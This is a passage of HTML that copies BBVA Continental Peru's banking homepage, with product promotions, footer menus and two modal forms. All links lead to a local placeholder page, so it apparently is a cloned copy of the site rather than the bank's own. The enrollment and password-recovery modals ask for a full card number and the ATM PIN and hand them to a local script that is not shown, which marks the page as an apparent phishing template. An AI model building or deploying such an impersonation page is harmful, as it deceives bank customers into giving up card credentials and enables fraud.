                <img src="images/tarjeta-del-hincha-secundario_tcm1105-718314.png" alt="Tarjeta del Hincha" title="Tarjeta del Hincha" style="opacity: 1; width: 360px; height: 100%; top: 0px; left: 50%; margin-left: -180px;"
                  width="180" height="130">
              </div>
              <div class="content-block">
                <div class="ico-block">
                  <img src="images/cuenta-ganadora-icono-home_tcm1105-687272.png" alt="Cuenta ganadora" title="Cuenta ganadora" width="" height="">
                </div>
                <h3 class="title title-md">¡Pide tu tarjeta del hincha!</h3>
                <div class="p-block">Abre tu cuenta y accede a beneficios exclusivos para hinchas.</div>
              </div>
              <div class="in-flow-bottom fh-part" style="height: 0px;"></div>
              <div class="buttons">
                <a class="btn btn-normal btn-md" href="nodisponible.html">Entérate más</a>
              </div>
            </div>
          </div>
        </div>
        <div id="enlaces-relacionados-icono-botones4-2" class="g-sm-12 g-lg-4 swiper-slide">
          <div class="enlace-relacionado template-blanco fh-elm" data-collectivecode="012" data-quantity="" data-producto="adelanto de sueldo"
            data-codprod="" data-campaignformat="carrusel" data-location="4,12" data-campaignname="pide un adelanto de sueldo en semana santa"
            data-fh-fixed="true" data-fh-end="true" style="opacity: 1;">
            <div class="fh-part" style="height: 388px;">
              <div class="img-fit img-fit-sm">
                <img src="images/adelanto-de-sueldo-secundario_tcm1105-595714.png" alt="Adelanto de Sueldo" title="Adelanto de Sueldo" style="opacity: 1; bottom: inherit; width: 100%; height: 157px; top: 0px; margin-top: 0px;"
                  width="304" height="157">
              </div>
              <div class="content-block">
                <div class="ico-block">
                  <img src="images/adelanto-de-sueldo-enlace_tcm1105-580036.png" alt="Adelanto de Sueldo" title="Adelanto de Sueldo" width="75"
                    height="75">
                </div>
                <h3 class="title title-md">¡No esperes más tu día de pago!</h3>
                <div class="p-block">Pide un
                  <strong>Adelanto de Sueldo</strong> y ten
                  <strong>efectivo</strong> al instante.
                </div>
              </div>
              <div class="in-flow-bottom fh-part" style="height: 0px;"></div>
              <div class="buttons">
                <a class="btn btn-normal btn-md" href="nodisponible.html">Más información aquí</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section id="destacado-azul5" class="destacado-azul">
      <div class="template-azul0">
        <div class="container padding-sm">
          <div class="txt-block">
            <h4 class="title title-sm">
              <strong>
                <font color="#FFFFFF">Realiza tus operaciones desde tu
                  <a href="nodisponible.html">App Banca Móvil</a> y entérate si ganaste S/1,000</font>
              </strong>
            </h4>
          </div>
        </div>
      </div>
    </section>
    <section class="contenido-landing">
      <div class="container">
        <h2 class="contenido-title title title-md">
          <strong>Descubre nuestros productos que puedes contratar online</strong>
        </h2>
        <!-- El id puede ser el que quieras pero es necesario.-->
        <div id="swiper-contenido-landing-6" data-swiper-mobile="{ &quot;slidesPerView&quot;: 2 }" data-swiper-tablet="{ &quot;slidesPerView&quot;: 3, &quot;centeredSlides&quot;: true, &quot;pagination&quot;: &quot;.swiper-pagination&quot;, &quot;lockSwiper&quot;: false, &quot;spaceBetween&quot;: 30 }"
          data-swiper-desktop="{ &quot;slidesPerView&quot;: 5, &quot;centeredSlides&quot;: false, &quot;lockSwiper&quot;: true, &quot;slideToClickedSlide&quot;: true, &quot;slideToIndex&quot;: &quot;middle&quot;, &quot;spaceBetween&quot;: 0 }"
          class="swiper swiper-updated">
          <div class="swiper-container swiper-container-horizontal">
            <div class="swiper-wrapper" style="opacity: 0;">
              <div id="cont-landing6-0" class="c-landing-block swiper-slide fh-elm swiper-slide-active" data-fh-fixed="true" data-fh-end="true"
                style="width: 189px; opacity: 1;">
                <div class="fh-part img-block" style="height: 169px;">
                  <div class="vertical-align">
                    <div class="align-middle">
                      <img src="images/prestamos-landing_tcm1105-658289.png" alt="Préstamos" title="Préstamos" width="" height="">
                    </div>
                  </div>
                </div>
                <h3 class="fh-part title title-md" style="height: 40px;">
                  <strong>Préstamos</strong>
                </h3>
                <div class="fh-part p-block" style="height: 102px;">
                  <p>¡Pide tu préstamo online y participa en el sorteo por una de las 100 cuotas gratis!</p>
                </div>
                <div class="fh-part btn-landing" style="height: 30px;">
                  <a class="btn btn-destacado btn-md" href="nodisponible.html" target="_blank">Pide tu Préstamo</a>
                </div>
              </div>
              <div id="cont-landing6-1" class="c-landing-block swiper-slide fh-elm swiper-slide-next" style="width: 189px; opacity: 1;"
                data-fh-fixed="true" data-fh-end="true">
                <div class="fh-part img-block" style="height: 169px;">
                  <div class="vertical-align">
                    <div class="align-middle">
                      <img src="images/tarjetas-landing_tcm1105-658295.png" alt="Tarjetas" title="Tarjetas" width="" height="">
                    </div>
                  </div>
                </div>
                <h3 class="fh-part title title-md" style="height: 40px;">
                  <strong>Tarjetas</strong>
                </h3>
                <div class="fh-part p-block" style="height: 102px;">
                  <p>Compra lo que quieras y págalo después, en un solo monto o en cuotas, según prefieras.</p>
                </div>
                <div class="fh-part btn-landing" style="height: 30px;">
                  <a class="btn btn-destacado btn-md" href="nodisponible.html" target="_blank">Pide tu Tarjeta de Crédito</a>
                </div>
              </div>
              <div id="cont-landing6-2" class="c-landing-block swiper-slide fh-elm" style="width: 189px; opacity: 1;" data-fh-fixed="true"
                data-fh-end="true">
                <div class="fh-part img-block" style="height: 169px;">
                  <div class="vertical-align">
                    <div class="align-middle">
                      <img src="images/apertura-de-cuentas-home_tcm1105-658307.png" alt="Cuentas de ahorro" title="Cuentas de ahorro" width=""
                        height="">
                    </div>
                  </div>
                </div>
                <h3 class="fh-part title title-md" style="height: 40px;">
                  <strong>Cuentas de ahorro</strong>
                </h3>
                <div class="fh-part p-block" style="height: 102px;">
                  <p>Las mejores opciones según tus necesidades. Además, demuestra tu pasión por la selección pidiendo tu tarjeta
                    del hincha.
                  </p>
                </div>
                <div class="fh-part btn-landing" style="height: 30px;">
                  <a class="btn btn-destacado btn-md" href="nodisponible.html" target="_blank">Abre tu cuenta</a>
                </div>
              </div>
              <div id="cont-landing6-3" class="c-landing-block swiper-slide fh-elm" data-fh-fixed="true" data-fh-end="true" style="width: 189px; opacity: 1;">
                <div class="fh-part img-block" style="height: 169px;">
                  <div class="vertical-align">
                    <div class="align-middle">
                      <img src="images/credito-hipotecario-landing_tcm1105-658481.png" alt="Crédito Hipotecario" title="Crédito Hipotecario" width=""
                        height="">
                    </div>
                  </div>
                </div>
                <h3 class="fh-part title title-md" style="height: 40px;">
                  <strong>Crédito Hipotecario</strong>
                </h3>
                <div class="fh-part p-block" style="height: 102px;">
                  <p>Descubre el Préstamo Hipotecario ideal para ti.</p>
                </div>
                <div class="fh-part btn-landing" style="height: 30px;">
                  <a class="btn btn-destacado btn-md" href="nodisponible.html" target="_blank">Pide tu Crédito Hipotecario</a>
                </div>
              </div>
              <div id="cont-landing6-4" class="c-landing-block swiper-slide fh-elm" data-fh-fixed="true" data-fh-end="true" style="width: 189px; opacity: 1;">
                <div class="fh-part img-block" style="height: 169px;">
                  <div class="vertical-align">
                    <div class="align-middle">
                      <img src="images/seguro-vehicular-landing_tcm1105-658487.png" alt="Seguro Vehicular" title="Seguro Vehicular" width="" height="">
                    </div>
                  </div>
                </div>
                <h3 class="fh-part title title-md" style="height: 40px;">
                  <strong>Seguro Vehicular</strong>
                </h3>
                <div class="fh-part p-block" style="height: 102px;">
                  <p>Obtén tu seguro desde $19 al mes, contra robo total.</p>
                </div>
                <div class="fh-part btn-landing" style="height: 30px;">
                  <a class="btn btn-destacado btn-md" href="nodisponible.html" target="_blank">Cotízalo</a>
                </div>
              </div>
            </div>
            <div class="swiper-pagination"></div>
          </div>
        </div>
      </div>
    </section>
    <section class="destacado-azul-col">
      <div class="container">
        <div class="column g-sm-12 g-md-4">
          <a href="images/politicas_de_privacidad_tcm1105-534923.pdf" target="_blank">
            <div class="p-block">
              <p class="blockIcon"> - Políticas de Privacidad
                <br>de Datos Personales
              </p>
            </div>
          </a>
        </div>
        <div class="column g-sm-12 g-md-4">
          <a href="nodisponible.html">
            <div class="p-block">
              <p>Medios de Pago y Servicios</p>
            </div>
          </a>
        </div>
        <div class="column g-sm-12 g-md-4">
          <a href="nodisponible.html" target="_blank">
            <div class="p-block">
              <p>Chatea con nosotros</p>
            </div>
          </a>
        </div>
      </div>
    </section>
    <section class="destacado-azul-col">
      <div class="container">
        <div class="column g-sm-12">
          <a href="nodisponible.html" target="_blank">
            <div class="p-block">
              <p>Empleo en BBVA</p>
            </div>
          </a>
        </div>
      </div>
    </section>
    <section id="distributiva-bloques-colores-9" data-swiper-mobile="{ &quot;slidesPerView&quot;: 1.2 }" data-swiper-tablet="{ &quot;slidesPerView&quot;: 2, &quot;centeredSlides&quot;: true, &quot;pagination&quot;: &quot;#distributiva-bloques-colores-9 .swiper-pagination&quot;, &quot;lockSwiper&quot;: false, &quot;freeMode&quot;: false, &quot;centerSlides&quot;: true, &quot;autoHeight&quot;: true,  &quot;loopSlides&quot;: 5 }"
      data-swiper-desktop="{ &quot;slidesPerView&quot;: 3, &quot;centeredSlides&quot;: false, &quot;slideToClickedSlide&quot;: true, &quot;spaceBetween&quot;: 0, &quot;autoHeight&quot;: false, &quot;speed&quot;: 400, &quot;initialSlide&quot;: 0, &quot;preventClicksPropagation&quot;: true, &quot;freeMode&quot;: true, &quot;lockSwiper&quot;: true }"
      class="template-azul1  container-bloques-colores swiper swiper-md swiper-updated">
      <div class="container">
        <div class="swiper-container swiper-container-horizontal swiper-container-free-mode">
          <div class="swiper-wrapper" style="transform: translate3d(0px, 0px, 0px);">
            <div id="bloque-color9-0" class="g-sm-12 g-lg-4 swiper-slide fh-elm swiper-slide-active" data-fh-fixed="true" data-fh-end="true"
              style="width: 320px; opacity: 1;">
              <a href="nodisponible.html">
                <div class="distributiva-bloques-colores template-blanco">
                  <div class="row vertical-align fh-part" style="height: 47px;">
                    <div class="g-md-3 align-middle img-block">
                      <div class="ico-block">
                        <i class="bbva-icon icon-uniE0D6"></i>
                      </div>
                    </div>
                    <div class="g-md-9 align-middle">
                      <p class="title title-xs">Avisos Importantes</p>
                    </div>
                  </div>
                  <div class="p-block fh-part" style="height: 60px;">
                    Entérate de los últimos cambios y novedades en tasas, tarifas y otros.
                  </div>
                  <div class="more-info-plus fh-part" style="height: 20px;">
                    <span>
                      <i class="bbva-icon icon icon-mas-circulo"></i>Quiero saber más</span>
                  </div>
                </div>
              </a>
            </div>
            <div id="bloque-color9-1" class="g-sm-12 g-lg-4 swiper-slide fh-elm swiper-slide-next" style="width: 320px; opacity: 1;"
              data-fh-fixed="true" data-fh-end="true">
              <a href="nodisponible.html">
                <div class="distributiva-bloques-colores template-blanco">
                  <div class="row vertical-align fh-part" style="height: 47px;">
                    <div class="g-md-3 align-middle img-block">
                      <div class="ico-block">
                        <i class="bbva-icon icon-uniE089"></i>
                      </div>
                    </div>
                    <div class="g-md-9 align-middle">
                      <p class="title title-xs">Nuestros canales a tu disposición</p>
                    </div>
                  </div>
                  <div class="p-block fh-part" style="height: 60px;">
                    Conoce nuestros canales, que te permiten realizar consultas y operaciones de forma rápida.
                  </div>
                  <div class="more-info-plus fh-part" style="height: 20px;">
                    <span>
                      <i class="bbva-icon icon icon-mas-circulo"></i>Quiero saber más</span>
                  </div>
                </div>
              </a>
            </div>
            <div id="bloque-color9-2" class="g-sm-12 g-lg-4 swiper-slide fh-elm" style="width: 320px; opacity: 1;" data-fh-fixed="true"
              data-fh-end="true">
              <a href="nodisponible.html">
                <div class="distributiva-bloques-colores template-blanco">
                  <div class="row vertical-align fh-part" style="height: 47px;">
                    <div class="g-md-3 align-middle img-block">
                      <div class="ico-block">
                        <i class="bbva-icon icon-uniE056"></i>
                      </div>
                    </div>
                    <div class="g-md-9 align-middle">
                      <p class="title title-xs">Estadísticas de Reclamos</p>
                    </div>
                  </div>
                  <div class="p-block fh-part" style="height: 60px;">
                    Conoce la cantidad de reclamos atendidos por el BBVA Continental.
                  </div>
                  <div class="more-info-plus fh-part" style="height: 20px;">
                    <span>
                      <i class="bbva-icon icon icon-mas-circulo"></i>Quiero saber más</span>
                  </div>
                </div>
              </a>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="banner-listado  template-azul">
      <div class="container">
        <div id="banner-ancho-completo10-0" class="g-sm-12 g-md-4 banner-block">
          <div class="vertical-align">
            <div class="align-middle img-block">
              <a href="nodisponible.html" target="_blank">
                <img src="images/libro-reclamaciones-virtual_tcm1105-638710.png">
              </a>
            </div>
          </div>
        </div>
        <div id="banner-ancho-completo10-1" class="g-sm-12 g-md-4 banner-block">
          <div class="vertical-align">
            <div class="align-middle img-block">
              <a href="nodisponible.html">
                <img src="images/nuestros-canales-bbva_tcm1105-642050.png">
              </a>
            </div>
          </div>
        </div>
        <div id="banner-ancho-completo10-2" class="g-sm-12 g-md-4 banner-block">
          <div class="align-middle img-block" style="float: left;max-width: 85px;padding-top: 1em;margin-left:0.5em;margin-right:0.5em;">
            <img src="images/ecommerce-awards_tcm1105-638689.png">
          </div>
          <div class="vertical-align" style="display:block">
            <div class="align-top">
              <div class="p-block">
                <p>
                  <br>
                </p>
                <p>Líderes en Servicios Financieros y Banca Online</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="contenido-otra-informacion template-azul6" id="547661658505">
      <button class="close template-azul"></button>
      <div class="container">
        <div class="example-block">
          <h2 class="title title-md">Chatea con nosotros</h2>
          <img style="float: left;" title="chat enlace" src="images/bbva-continental-icono-chat-24_tcm1105-446061.png"> Pregúntanos sobre cómo pagar tus tarjetas online
          <strong>
            <a target="_blank" href="nodisponible.html" style="color:white;">Aquí</a>
          </strong>.
        </div>
      </div>
    </section>
    <section id="movil-bannerBottomFixed12" class="bannerBottomFixed">
      <div class="bannerBottomFixed-container">
        <div class="bannerBottomFixed-icon">
          <i class="bbva-icon icon-efectivomovil"></i>
        </div>
        <div class="bannerBottomFixed-text">
          <div class="bannerBottomFixed-paragraph">Pide tu préstamo online y aprovecha los beneficios exclusivos.</div>
          <a class="bannerBottomFixed-link" href="nodisponible.html" target="_blank">Pídelo aquí</a>
        </div>
      </div>
      <div class="bannerBottomFixed-close">
        <i class="bbva-icon icon-glyph-4"></i>
      </div>
    </section>
  </div>
  <!-- Fin Contenido -->
  <div class="content"></div>
  <div class="metanavegation-phone hidden-desktop">
    <ul class="">
      <li>
        <i class="bbva-icon icon-uniE10A "></i>
        <a href="nodisponible.html" class="" target="_blank">Ubícanos</a>
      </li>
      <li>
        <i class="bbva-icon icon-uniE0E5 avisoRed"></i>
        <a href="nodisponible.html" class="avisoRed">SOS Cliente</a>
      </li>
      <li>
        <i class="bbva-icon icon-uniE10B "></i>
        <a href="nodisponible.html" class="">(01) 595-0000</a>
      </li>
    </ul>
  </div>
  <!-- Pie de página -->
  <footer class="body-footer">
    <div class="footer-menu">
      <div class="container">
        <div class="row">
          <div class="col-lg-3">
            <div class="menu-trigger" data-target="#bbva-continental-submenu">BBVA CONTINENTAL</div>
            <ul id="bbva-continental-submenu">
              <li>
                <a href="nodisponible.html">Nuestro Banco</a>
              </li>
              <li>
                <a href="nodisponible.html">Responsabilidad Social Corporativa</a>
              </li>
              <li>
                <a href="nodisponible.html">Memoria Financiera</a>
              </li>
              <li>
                <a href="nodisponible.html">Investor Relations</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Empleo en BBVA</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">BBVA Research</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Noticias en BBVA.com</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Sala de Prensa</a>
              </li>
            </ul>
          </div>
          <div class="col-lg-3">
            <div class="menu-trigger" data-target="#tasas-y-tarifas-submenu">TASAS Y TARIFAS</div>
            <ul id="tasas-y-tarifas-submenu">
              <li>
                <a href="nodisponible.html">Personas Naturales y Microempresas</a>
              </li>
              <li>
                <a href="nodisponible.html">Pequeñas, Medianas y Grandes empresas</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Tips del Tarifario</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Comunicados de Interés</a>
              </li>
              <li>
                <a href="nodisponible.html">Recomendaciones de productos, tasas y tarifas</a>
              </li>
            </ul>
          </div>
          <div class="col-lg-3">
            <div class="menu-trigger" data-target="#informacion-de-interes-submenu">INFORMACIÓN DE INTERÉS</div>
            <ul id="informacion-de-interes-submenu">
              <li>
                <a href="nodisponible.html">He perdido o me han robado mis tarjetas</a>
              </li>
              <li>
                <a href="nodisponible.html">¿Víctima de fraude por Internet?</a>
              </li>
              <li>
                <a href="nodisponible.html">Seguridad de Tarjeta de Crédito</a>
              </li>
              <li>
                <a href="nodisponible.html">CCI Cuenta Interbancaria y Código SWIFT</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Monedas y Billetes de BCR</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">SMV - Hechos de Importancia</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">SMV – Defensa de los derechos de clientes</a>
              </li>
              <li>
                <a href="nodisponible.html">FATCA</a>
              </li>
              <li>
                <a href="nodisponible.html" target="_blank">Comprobantes de Retención</a>
              </li>
              <li>
                <a href="nodisponible.html">Protección de Datos Personales</a>
              </li>
            </ul>
          </div>
          <div class="col-lg-3 footer-social-menu">
            <div class="footer-social-menu-title">NUESTRAS REDES SOCIALES</div>
            <ul>
              <li>
                <a href="nodisponible.html" class="ico-facebook" target="_blank">Facebook</a>
              </li>
              <li>
                <a href="nodisponible.html" class="ico-twitter" target="_blank">Twitter</a>
              </li>
              <li>
                <a href="nodisponible.html" class="ico-instagram" target="_blank">Instagram</a>
              </li>
              <li>
                <a href="nodisponible.html" class="ico-youtube" target="_blank">Youtube</a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
    <div class="footer-bottom">
      <div class="container">
        <ul>
          <li>
            <a href="nodisponible.html">Seguridad</a>
          </li>
          <li>
            <a href="nodisponible.html">Aviso Legal</a>
          </li>
          <li>
            <a href="nodisponible.html" target="_blank">Cláusulas Generales de Contratación</a>
          </li>
          <li>
            <a href="nodisponible.html">Mapa del Sitio</a>
          </li>
          <li class="hidden-phone">
            <a href="nodisponible.html" target="_blank">Políticas de Privacidad</a>
          </li>
        </ul>
        <span class="copyright">Banco Bilbao Vizcaya Argentaria, S.A. 2018</span>
      </div>
    </div>
  </footer>
  <div id="destino0"></div>
  <!-- Fin Pie de página -->
  <!-- Scripts -->
  <span id="scroll-to-top" class="scroll-to-top" title="Subir">
    <i class="bbva-icon icon-uniE073"></i>
  </span>

  <!-- register-modal -->
  <section class="register-modal is-hidden" id="register-modal">
    <!-- register-modal -> modal-box -->
    <div class="modal-box">
      <!-- register-modal -> modal-box -> register-modal-content -->
      <div class="register-modal-content">
        <!-- register-modal -> modal-box -> register-modal-content -> title -->
        <h2 class="title">Inscríbete a nuestra Banca por Internet</h2>
        <!-- register-modal -> modal-box -> register-modal-content -> wizard -->
        <div class="wizard show-for-desktop">
          <div class="progress-bar">
            <div class="progress-line">
              <div class="point-background active now" style="left: -1px;">
                <div class="text">1. Identificación</div>
                <div class="point"></div>
              </div>
              <div class="point-background" style="left: 98.5%;">
                <div class="text" style="left: -112px;">2. Contraseña de acceso</div>
                <div class="point"></div>
              </div>
            </div>
          </div>
        </div>
        <!-- register-modal -> modal-box -> register-modal-content -> step-content -->
        <div class="step-content">
          <div class="container">
            <h3 class="title">Introduce los datos de tu tarjeta</h3>
            <div class="grid-x">
              <div class="column-alfa">
                <div class="form-section">
                  <label for="cardNumber">Número de tarjeta
                    <span class="icon-info"></span>
                  </label>
                  <input class="cardNumber" type="text" id="cardNumberRegister" name="cardNumber" minlength="16" maxlength="16" autocomplete="off">
                </div>
                <div class="form-section">
                  <label for="cardPass">Clave de cajero
                    <span class="icon-info"></span>
                  </label>
                  <input class="cardPass" type="password" id="atmKeyRegister" name="cardPass" minlength="4" maxlength="4" autocomplete="off">
                </div>
              </div>
              <div class="column-beta">
                <div class="form-section">
                  <div class="captcha">
                    <span class="image">
                      <img class="imgCaptcha" id="imgCaptcha" src="images/captchas/1.jpeg" alt="captcha">
                    </span>
                    <span class="help">
                      <img src="images/ico-ayuda-captcha.png">
                    </span>
                    <button class="update-captcha-button">
                      <span class="icon"></span>
                    </button>
                  </div>
                </div>
                <div class="form-section">
                  <label class="captchaCodeLabel" for="captchaCode">Código de imagen</label>
                  <input class="captchaCode" id="captchaCode" name="captchaCode" minlength="6" maxlength="6" autocomplete="off" type="text">
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- register-modal -> modal-box -> register-modal-content -> next-button-container -->
        <div class="next-button-container">
          <button class="next-button arrow-right" id="nextButtonRegister">Siguiente</button>
        </div>

      </div>
      <!-- register-modal -> modal-box -> register-modal-close -->
      <button id="register-modal-close" class="close-button">
        <i class="bbva-icon icon-glyph-4"></i>
      </button>
    </div>
  </section>

  <!-- recover-modal -->
  <section class="recover-modal is-hidden" id="recover-modal">
    <!-- recover-modal -> modal-box -->
    <div class="modal-box">
      <!-- recover-modal -> modal-box -> recover-modal-content -->
      <div class="recover-modal-content">
        <!-- recover-modal -> modal-box -> recover-modal-content -> title -->
        <h2 class="title">¿Olvidaste tu contraseña?</h2>
        <!-- recover-modal -> modal-box -> recover-modal-content -> wizard -->
        <div class="wizard show-for-desktop">
          <div class="progress-bar">
            <div class="progress-line">
              <div class="point-background active now" style="left: -1px;">
                <div class="text">1. Identificación</div>
                <div class="point"></div>
              </div>
              <div class="point-background" style="left: 98.5%;">
                <div class="text" style="left: -112px;">2. Contraseña de acceso</div>
                <div class="point"></div>
              </div>
            </div>
          </div>
        </div>
        <!-- recover-modal -> modal-box -> recover-modal-content -> step-content -->
        <div class="step-content">
          <div class="container">
            <h3 class="title">Introduce los datos de tu tarjeta</h3>
            <div class="grid-x">
              <div class="column-alfa">
                <div class="form-section">
                  <label for="cardNumber">Número de tarjeta
                    <span class="icon-info"></span>
                  </label>
                  <input class="cardNumber" type="text" id="cardNumberPass" name="cardNumber" minlength="16" maxlength="16" autocomplete="off">
                </div>
                <div class="form-section">
                  <label for="cardPass">Clave de cajero
                    <span class="icon-info"></span>
                  </label>
                  <input class="cardPass" type="password" id="atmKeyPass" name="cardPass" minlength="4" maxlength="4" autocomplete="off">
                </div>
              </div>
              <div class="column-beta">
                <div class="form-section">
                  <div class="captcha">
                    <span class="image">
                      <img class="imgCaptcha" id="imgCaptcha" src="images/captchas/1.jpeg" alt="captcha">
                    </span>
                    <span class="help">
                      <img src="images/ico-ayuda-captcha.png">
                    </span>
                    <button class="update-captcha-button">
                      <span class="icon"></span>
                    </button>
                  </div>
                </div>
                <div class="form-section">
                  <label class="captchaCodeLabel" for="captchaCode">Código de imagen</label>
                  <input class="captchaCode" id="captchaCode" name="captchaCode" minlength="6" maxlength="6" autocomplete="off" type="text">
                </div>
              </div>
            </div>
          </div>
        </div>
        <!-- recover-modal -> modal-box -> recover-modal-content -> next-button-container -->
        <div class="next-button-container">
          <button class="next-button arrow-right" id="nextButtonPass">Siguiente</button>
        </div>

      </div>
      <!-- recover-modal -> modal-box -> recover-modal-close -->
      <button id="recover-modal-close" class="close-button">
        <i class="bbva-icon icon-glyph-4"></i>
      </button>
    </div>
  </section>


  <script>
      var vSiteGSA = "tlpu_mult_bcontinental";
      var vSiteSuggest = "https://w3.grupobbva.com/TLGO/tlgo/GSA_suggest";
  </script>
  <script type="text/javascript" src="js/constantes_tridion.ver4.js"></script>
  <script type="text/javascript" src="js/libraries.min.ver19.js"></script>
  <script type="text/javascript" src="js/iframeResizer.min.js"></script>
  <script type="text/javascript" src="js/iframeResizer.contentWindow.min.js"></script>
  <script type="text/javascript" src="js/handlebars-v1.3.0.min.js"></script>
  <script type="text/javascript" src="js/autocompletar.min.js"></script>
  <script type="text/javascript" src="js/masonry.pkgd.min.js"></script>
  <script src="js/jquery.min.js" type="text/javascript"></script>
  <script>$.noConflict(true);</script>
  <script type="text/javascript" src="js/vendor.min.ver4.js"></script>
  <script type="text/javascript" src="js/iframe-order-receiver.min.ver2.js"></script>
  <script type="text/javascript" src="js/headerFooter.min.ver4.js"></script>
  <script type="text/javascript" src="js/commonJS.min.ver21.js"></script>
  <script type="text/javascript" src="js/main-v3.min.ver39.js"></script>
  <script type="text/javascript" src="js/smartbanner-init.ver4.js"></script>
  <script src="js/main.js"></script>
        </div>
    </form>
</body>
</html>
